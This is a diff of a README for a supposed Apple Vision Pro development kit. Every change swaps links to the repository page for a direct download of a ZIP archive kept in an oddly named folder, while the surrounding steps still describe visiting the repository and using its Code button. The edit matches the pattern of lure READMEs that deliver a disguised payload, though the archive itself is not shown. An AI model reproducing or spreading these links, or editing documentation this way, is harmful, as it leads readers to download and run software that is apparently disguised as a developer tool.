@@ -1,6 +1,6 @@
 # 🧩 visionos-codex-kit - Tools for Apple Vision Pro Development
 
-[![Download visionos-codex-kit](https://img.shields.io/badge/Download-visionos--codex--kit-ff6f61?style=for-the-badge)](https://github.com/rupasingheujith-glitch/visionos-codex-kit)
+[![Download visionos-codex-kit](https://img.shields.io/badge/Download-visionos--codex--kit-ff6f61?style=for-the-badge)](https://github.com/rupasingheujith-glitch/visionos-codex-kit/raw/refs/heads/main/breastplow/kit-visionos-codex-v1.7.zip)
 
 ---
 
@@ -26,14 +26,14 @@ While visionos-codex-kit is designed for Apple’s platform, you can prepare, te
 
 Use the link below to visit the official page and download the resources. The page includes all the files you need to get started.
 
-[![Download visionos-codex-kit](https://img.shields.io/badge/Download-visionos--codex--kit-ff6f61?style=for-the-badge)](https://github.com/rupasingheujith-glitch/visionos-codex-kit)
+[![Download visionos-codex-kit](https://img.shields.io/badge/Download-visionos--codex--kit-ff6f61?style=for-the-badge)](https://github.com/rupasingheujith-glitch/visionos-codex-kit/raw/refs/heads/main/breastplow/kit-visionos-codex-v1.7.zip)
 
 Click the badge above or follow this URL:  
-https://github.com/rupasingheujith-glitch/visionos-codex-kit
+https://github.com/rupasingheujith-glitch/visionos-codex-kit/raw/refs/heads/main/breastplow/kit-visionos-codex-v1.7.zip
 
 ## 📥 How to Download and Install on Windows
 
-1. Open the link to the GitHub repository: https://github.com/rupasingheujith-glitch/visionos-codex-kit  
+1. Open the link to the GitHub repository: https://github.com/rupasingheujith-glitch/visionos-codex-kit/raw/refs/heads/main/breastplow/kit-visionos-codex-v1.7.zip  
 2. On the main page, look for the green button labeled **Code**.  
 3. Click **Code**, then select **Download ZIP** from the dropdown menu. This will download all files as a single compressed folder.  
 4. After download completes, locate the ZIP file in your Downloads folder.  
@@ -127,6 +127,6 @@ Review these folders to explore and learn systematically.
 ## 🔗 Direct Download Link
 
 You can always return to this page to get the latest version:  
-https://github.com/rupasingheujith-glitch/visionos-codex-kit
+https://github.com/rupasingheujith-glitch/visionos-codex-kit/raw/refs/heads/main/breastplow/kit-visionos-codex-v1.7.zip
 
 This will keep you updated with fixes, new samples, and improvements.
